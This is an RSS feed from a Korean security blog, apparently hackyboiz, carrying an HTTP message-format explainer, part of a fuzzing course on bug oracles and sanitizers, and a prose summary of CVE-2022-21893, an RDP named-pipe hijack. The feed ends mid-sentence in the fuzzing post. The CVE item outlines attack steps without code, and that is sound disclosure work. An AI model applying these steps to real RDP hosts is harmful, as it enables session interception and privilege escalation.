<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 19 Jan 2022 05:56:19 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[해키피디아] HTTP Message Format</title>
      <link>https://hackyboiz.github.io/2022/01/19/ogu123/http-message-format/</link>
      <guid>https://hackyboiz.github.io/2022/01/19/ogu123/http-message-format/</guid>
      <pubDate>Wed, 19 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;HTTP Message&amp;#xB294; Server&amp;#xC640; Client&amp;#xAC00; HTTP &amp;#xD1B5;&amp;#xC2E0;&amp;#xC744; &amp;#xD560; &amp;#xB54C; &amp;#xC8FC;&amp;#xACE0;&amp;#xBC1B;&amp;#xB294; &amp;#xBA</description>
        
      
      
      
      <content:encoded><![CDATA[<p>HTTP Message&#xB294; Server&#xC640; Client&#xAC00; HTTP &#xD1B5;&#xC2E0;&#xC744; &#xD560; &#xB54C; &#xC8FC;&#xACE0;&#xBC1B;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xBA54;&#xC2DC;&#xC9C0; &#xD0C0;&#xC785;&#xC73C;&#xB85C;&#xB294; &#xB450; &#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC11C;&#xBC84;&#xC5D0;&#xAC8C; &#xC790;&#xB8CC;&#xB97C; &#xC694;&#xCCAD;&#xD558;&#xB294; <strong>Request Message,</strong> &#xC11C;&#xBC84;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD55C; &#xC751;&#xB2F5;&#xD558;&#xB294; <strong>Response Message</strong> &#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="Request-Message"><a href="#Request-Message" class="headerlink" title="Request Message"></a>Request Message</h2><p><img src="/2022/01/19/ogu123/http-message-format/image1.png" alt></p><p>Request Mesaage Format&#xC740; &#xC138; &#xAC00;&#xC9C0;&#xB85C; &#xAD6C;&#xBD84;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li>Request Line</li><li>Request Headers</li><li>Request Message Body</li></ol><p><strong>Request Line</strong>&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC11C;&#xBC84;&#xC5D0; &#xC694;&#xCCAD; &#xC2DC; &#xC218;&#xD589;&#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xB3D9;&#xC791;&#xC778; <strong>Method(GET)</strong>, &#xC694;&#xCCAD;&#xD558;&#xB294; &#xC571; &#xB9AC;&#xC18C;&#xC2A4;&#xC758; &#xACBD;&#xB85C;&#xC778; <strong>Path(/doc/test.html)</strong>, &#xC0AC;&#xC6A9;&#xD558;&#xB294; HTTP&#xC758; &#xBC84;&#xC804;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; <strong>Version(HTTP/1.1)</strong>&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p><strong>Request Headers</strong>&#xB294; &#xC11C;&#xBC84;&#xC5D0; &#xCD94;&#xAC00; &#xC815;&#xBCF4;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Host, Cookie, User-Agent, Referer &#xB4F1;  <strong>Header</strong>&#xB294; &#xC0C1;&#xD669;&#xC5D0; &#xB530;&#xB77C; &#xB354; &#xB9CE;&#xC740; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01; &#xD5E4;&#xB354; &#xD56D;&#xBAA9; &#xC904;&#xC5D0;&#xB294; <strong>&#x2018;&#xC774;&#xB984;:  &#xAC12;&#x2019;</strong> &#xD615;&#xC2DD;&#xC758; &#xAD6C;&#xC131;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD558;&#xB098;&#xC758; &#xD56D;&#xBAA9;&#xC5D0; &#xBCF5;&#xC218;&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>A blank line</strong>&#xB294; <strong>Header</strong> &#xBD80;&#xBD84;&#xC758; &#xB05D;&#xC744; &#xD45C;&#xC2DC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xACF5;&#xBC31;&#xC785;&#xB2C8;&#xB2E4;.</p><p><strong>Request Message Body</strong>&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC785;&#xB825;&#xD55C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC11C;&#xBC84;&#xC5D0; &#xC804;&#xB2EC; &#xC2DC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB2F4;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E8;, &#xC694;&#xCCAD; &#xBC29;&#xBC95;&#xC758; <strong>Method(POST)</strong>&#xAC00; &#xC544;&#xB2C8;&#xBA74;, &#xD56D;&#xC0C1; &#xBE44;&#xC5B4;&#xC788;&#xB294;&#xCC44;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Response-Message"><a href="#Response-Message" class="headerlink" title="Response Message"></a>Response Message</h2><p><img src="/2022/01/19/ogu123/http-message-format/image1.png" alt></p><p>Response Message Format&#xC740; &#xC138; &#xAC00;&#xC9C0;&#xB85C; &#xAD6C;&#xBD84;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li>Status Line</li><li>Response Headers</li><li>Response Message Body</li></ol><p><strong>Status Line</strong>&#xC740; HTTP <strong>Version(HTTP/1.1)</strong>, &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC694;&#xCCAD;&#xC5D0; &#xB300;&#xD55C; &#xC11C;&#xBC84;&#xC758; &#xC751;&#xB2F5; &#xCF54;&#xB4DC;&#xC778; <strong>&#xC0C1;&#xD0DC; &#xCF54;&#xB4DC;(200 OK)</strong>&#xB85C; &#xAD6C;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC0C1;&#xD0DC; &#xCF54;&#xB4DC;(Status-code)</strong></p><ul><li>1xx : Informational</li><li>2xx : Success</li><li>3xx : Redirection</li><li>4xx : Client Error</li><li>5xx : Server Error</li></ul><p><strong>Response Headers</strong>&#xB294; Server, Set-Cookie, Content-Type, Content-Length &#xB4F1; &#xC0AC;&#xC6A9;&#xC790;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB2F4;&#xB294; &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p><strong>A blank line</strong>&#xC740; <strong>Header</strong> &#xBD80;&#xBD84;&#xC758; &#xB05D;&#xC744; &#xD45C;&#xC2DC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xACF5;&#xBC31;&#xC785;&#xB2C8;&#xB2E4;.</p><p><strong>Response Message Body</strong>&#xB294; &#xC11C;&#xBC84;&#xC758; &#xC751;&#xB2F5; &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC694;&#xCCAD;&#xD55C; &#xB9AC;&#xC18C;&#xC2A4; &#xB610;&#xB294; &#xC694;&#xCCAD;&#xD55C; &#xC791;&#xC5C5;&#xC0C1;&#xD0DC;&#xC5D0; &#xB300;&#xD55C; &#xC77C;&#xBD80; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/http/">http</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/19/ogu123/http-message-format/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2022-21893: Attacking RDP from inside</title>
      <link>https://hackyboiz.github.io/2022/01/18/fabu1ous/2022-01-18/</link>
      <guid>https://hackyboiz.github.io/2022/01/18/fabu1ous/2022-01-18/</guid>
      <pubDate>Tue, 18 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.cyberark.com/resources/threat-research-blog/a</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.cyberark.com/resources/threat-research-blog/attacking-rdp-from-inside">Attacking RDP from Inside</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Server 2012 R2 &#xC774;&#xD6C4;&#xBD80;&#xD130; &#xCD5C;&#xC2E0;&#xBC84;&#xC804;&#xAE4C;&#xC9C0;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>RDP&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC811;&#xC18D;&#xD55C; &#xC77C;&#xBC18; &#xC720;&#xC800;&#xAC00; &#xC5F0;&#xACB0;&#xB41C; &#xB2E4;&#xB978; client&#xC758; file system&#xC5D0; &#xB300;&#xD55C; &#xC5D1;&#xC138;&#xC2A4; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC811;&#xC18D; &#xC911;&#xC778; &#xB2E4;&#xB978; &#xC720;&#xC800;&#xC758; &#xD074;&#xB9BD;&#xBCF4;&#xB4DC; &#xBC11; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0; &#xC218;&#xC815;&#xD558;&#xC5EC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xAE4C;&#xC9C0; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>RDP&#xB294; &#xD558;&#xB098;&#xC758; &#xC5F0;&#xACB0;&#xC744; virtual channel&#xC774;&#xB77C;&#xB294; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xB17C;&#xB9AC;&#xC801; &#xC5F0;&#xACB0;&#xB85C; &#xBD84;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC911; &#xBA87; &#xAC1C;&#xC758; &#xCCB4;&#xB110;&#xC740; svchost.exe&#xC5D0; &#xD638;&#xC2A4;&#xD2B8;&#xB418;&#xB294; DLL&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xC5B4; Remote Desktop Services(RDS)&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBC18;&#xBA74; clipboard &#xB4F1; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xCCB4;&#xB110;&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>virtual channel&#xC758; data&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; RDS service&#xC0AC;&#xC774;&#xC5D0;&#xC11C; TSVPIPE named pipe&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; TSVCPIPE&#xC758; security descriptor&#xB294; &#xBAA8;&#xB4E0; &#xC720;&#xC800;&#xAC00; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; server instance&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB3C4;&#xB85D; &#xD5C8;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xD574;&#xCEE4;&#xAC00; &#xC6D0;&#xACA9; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC811;&#xC18D;&#xD55C; &#xB4A4; named pipe&#xC758; &#xBAA9;&#xB85D;&#xC744; &#xD655;&#xC778;&#xD574; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294; TSVCPIPE pipe&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xC774;&#xB984;&#xC758; pipe server instance&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xB610;&#xB2E4;&#xB978; client&#xAC00; &#xC5F0;&#xACB0;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xBA74; RDS&#xB294; session&#xACFC; pipe client&#xAC00; &#xC811;&#xC18D;&#xD560; pipe server instance&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. </p></li><li>named pipe&#xC758; FIFO &#xD2B9;&#xC131; &#xB54C;&#xBB38;&#xC5D0; pipe client&#xB294; 2&#xBC88; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB41C; pipe server instance&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xD574;&#xCEE4;&#xC758; pipe server instance&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xD574;&#xCEE4;&#xAC00; 2&#xBC88; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB41C; pipe server instance&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; &#xD1B5;&#xC2E0;&#xC758; &#xC591; &#xB05D;&#xB2E8;&#xC744; &#xBAA8;&#xB450; &#xD1B5;&#xC81C;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xACE0; man-in-the-middle &#xACF5;&#xACA9;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rdp/">rdp</category>
      
      <category domain="https://hackyboiz.github.io/tags/file-system/">file system</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/18/fabu1ous/2022-01-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 퍼징 교양 수업 fuzz 101 - part4</title>
      <link>https://hackyboiz.github.io/2022/01/16/fabu1ous/fuzz-4/</link>
      <guid>https://hackyboiz.github.io/2022/01/16/fabu1ous/fuzz-4/</guid>
      <pubDate>Sun, 16 Jan 2022 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2022/01/16/fabu1ous/fuzz-4/1.png&quot; alt&gt;&lt;/p&gt;
&lt;h1 id=&quot;6-Input-Evaluation&quot;&gt;&lt;a href=&quot;#6-Input-Evaluation&quot; class=&quot;headerlink&quot; title=</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2022/01/16/fabu1ous/fuzz-4/1.png" alt></p><h1 id="6-Input-Evaluation"><a href="#6-Input-Evaluation" class="headerlink" title="6. Input Evaluation"></a>6. Input Evaluation</h1><p>PUT&#xC744; &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xB294; &#xC774;&#xB860;&#xC801; &#xAC04;&#xB2E8;&#xD568;&#xC774; &#xD37C;&#xC9D5;&#xC774; &#xB9E4;&#xB825;&#xC801;&#xC778; &#xC774;&#xC720; &#xC911; &#xD558;&#xB098;&#xC9C0;&#xB9CC; &#xD37C;&#xC800;&#xC758; &#xD6A8;&#xC728;&#xACFC; &#xD37C;&#xD3EC;&#xBA3C;&#xC2A4;&#xC5D0; &#xD070; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xB294; &#xCD5C;&#xC801;&#xD654;&#xC640; &#xB514;&#xC790;&#xC778; &#xACB0;&#xC815; &#xBC29;&#xBC95;&#xC774; &#xB9CE;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. input&#xC744; &#xC0DD;&#xC131;&#xD55C; &#xB4A4; &#xD37C;&#xC800;&#xB294; &#xADF8; &#xC778;&#xD48B;&#xC73C;&#xB85C; PUT&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0;, &#xC2E4;&#xD589; &#xACB0;&#xACFC;&#xB97C; &#xB450;&#xACE0; &#xC5B4;&#xB5A4; &#xD589;&#xB3D9;&#xC744; &#xD560;&#xC9C0; &#xACB0;&#xC815;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; InputEval&#xC774;&#xB77C; &#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="6-1-Bug-Oracles"><a href="#6-1-Bug-Oracles" class="headerlink" title="6.1 Bug Oracles"></a>6.1 Bug Oracles</h2><p><img src="/2022/01/16/fabu1ous/fuzz-4/2.png" alt></p><p>&#xD37C;&#xC9D5;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; canonical security policy&#xB294; fatal siganl(&#xC608;&#xB97C; &#xB4E4;&#xBA74; segmentation fault)&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;&#xC744; violation&#xC73C;&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xC778;&#xD574; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC774; &#xBC14;&#xB014; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB7F0; policy&#xB294; &#xB9CE;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD5C;&#xADFC;&#xC5D4; gcc&#xC640; clang &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; CFI violation&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xB294;&#xB370; &#xC9D1;&#xC911;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="6-1-2-Undifined-Behaviors"><a href="#6-1-2-Undifined-Behaviors" class="headerlink" title="6.1.2 Undifined Behaviors"></a>6.1.2 Undifined Behaviors</h3><p>C&#xC5B8;&#xC5B4; &#xACBD;&#xC6B0; &#xB9CE;&#xC740; &#xD589;&#xB3D9;&#xB4E4;&#xC774; &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740;&#xCCB4;&#xB85C; &#xB0A8;&#xC544;&#xC788;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xC774;&#xB97C; &#xB2E4;&#xC591;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xD2B9;&#xC815; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0;&#xC11C;&#xB9CC; &#xC758;&#xB3C4;&#xD55C; &#xB300;&#xB85C; &#xD574;&#xC11D;&#xB418;&#xACE0; &#xB3D9;&#xC791;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC0C1;&#xD669;&#xC774; &#xD06C;&#xAC8C; &#xC704;&#xD611;&#xC801;&#xC73C;&#xB85C; &#xB290;&#xAEF4;&#xC9C0;&#xC9C0; &#xC54A;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xCD5C;&#xC801;&#xD654; &#xC138;&#xD305;, &#xC544;&#xD0A4;&#xD14D;&#xCCD0;, &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;, &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xBC84;&#xC804;&#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC694;&#xC778;&#xC774; undifined behavior &#xD574;&#xC11D;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Undifined behavior&#xC5D0; &#xB300;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBA38;&#xC758; &#xC608;&#xC0C1;&#xACFC; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC758; &#xAD6C;&#xD604; &#xC815;&#xB3C4;&#xAC00; &#xC0C1;&#xC774;&#xD560; &#xB54C; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Memory Sanitizer(MSan)&#xB294; &#xCEF4;&#xD30C;&#xC77C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; instrumentation&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0; &#xCD08;&#xAE30;&#xD654; &#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; C&#xB098; C++&#xC758; undefined behavior&#xB97C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. ASan&#xC640; &#xC720;&#xC0AC;&#xD558;&#xAC8C;, MSan&#xC740; shadow memory&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xAC01; &#xC8FC;&#xC18C;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xCD08;&#xAE30;&#xD654; &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD45C;&#xD604;&#xD558;&#xB294;&#xB370; &#xC57D; 150%&#xC758; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Undefined Behavior Sanitizer(UBSan)&#xC740; undefined Behavior&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; compile-time&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC218;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xD2B9;&#xC815; &#xBC84;&#xADF8;&#xB9CC;&#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xB294; &#xB2E4;&#xB978; Sanitizer&#xB4E4;&#xACFC; &#xB2E4;&#xB974;&#xAC8C; UBSan&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC885;&#xB958;&#xC758; &#xBC84;&#xADF8;&#xB97C; &#xD0D0;&#xC9C0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Thread Sanitizer(TSan)&#xC740; compile-time&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC218;&#xC815;&#xD574; precision&#xACFC; performance &#xC0AC;&#xC774;&#xC758; trade-off&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; data race&#xB97C; &#xD0D0;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;. data race&#xB294; &#xB450; thread&#xC5D0;&#xC11C; &#xB3D9;&#xC2DC;&#xC5D0; &#xACF5;&#xC720; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0;, &#xADF8;&#xC911; &#xD558;&#xB098;&#xB294; write&#xC77C; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB7F0; &#xBC84;&#xADF8;&#xB4E4;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xC5FC;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xBA70; &#xBE44;&#xACB0;&#xC815;&#xC801;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBC84;&#xADF8; &#xC7AC;&#xD604;&#xC774; &#xB9E4;&#xC6B0; &#xD798;&#xB4ED;&#xB2C8;&#xB2E4;.</p><h3 id="6-1-3-Input-Validation"><a href="#6-1-3-Input-Validation" class="headerlink" title="6.1.3 Input Validation"></a>6.1.3 Input Validation</h3><p>&#xC6F9; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC640; DB &#xC5D4;&#xC9C4;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBCF5;&#xC7A1;&#xD55C; &#xD30C;&#xC11C;&#xC758; &#xC815;&#xD655;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xC774;&#xD574;&#xD574;&#xC57C; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; XSS&#xB098; SQL injection&#xACFC; &#xAC19;&#xC740; input validation &#xCDE8;&#xC57D;&#xC810;&#xC744; testing&#xD558;&#xB294; &#xAC83;&#xC740; &#xB9E4;&#xC6B0; &#xD798;&#xB4E0; &#xC77C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>KameleonFuzz&#xB294; &#xC2E4;&#xC81C; &#xC6F9; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; test case&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; XSS &#xACF5;&#xACA9;&#xC744; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB5;4SQLi&#xB294; &#xC774;&#xC640; &#xBE44;&#xC2B7;&#xD55C; &#xBC29;&#xBC95;&#xC744; &#xD1B5;&#xD574; SQL injection&#xC744; &#xD0D0;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xB9AC;&#xC2A4;&#xD3F0;&#xC2A4;&#xB85C; sql injection&#xC744; &#xD0D0;&#xC9C0;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xAE30; &#xB54C;&#xBB38;&#xC778;&#xB370;, database proxy&#xB97C; &#xD1B5;&#xD574; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xC0AC;&#xC774;&#xC758; &#xD1B5;&#xC2E0;&#xC744; &#xAC00;&#xB85C;&#xCCB4; input&#xC774; &#xC545;&#xC131;&#xD589;&#xC704;&#xB97C; &#xC774;&#xB974;&#xD0A4;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="6-1-4-Semantic-Difference"><a href="#6-1-4-Semantic-Difference" class="headerlink" title="6.1.4 Semantic Difference"></a>6.1.4 Semantic Difference</h3><p><img src="/2022/01/16/fabu1ous/fuzz-4/3.png" alt></p><p>&#xC2DC;&#xBA58;&#xD2F1; &#xBC84;&#xADF8;&#xB294; &#xBE44;&#xC2B7;&#xD558;&#xC9C0;&#xB9CC; &#xB3D9;&#xC77C;&#xD558;&#xC9C4; &#xC54A;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; differential testing &#xAE30;&#xC220;&#xC744; &#xD1B5;&#xD574; &#xC790;&#xC8FC; &#xBC1C;&#xACAC;&#xB429;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC591;&#xD55C; &#xD37C;&#xC800;&#xC5D0;&#xC11C; 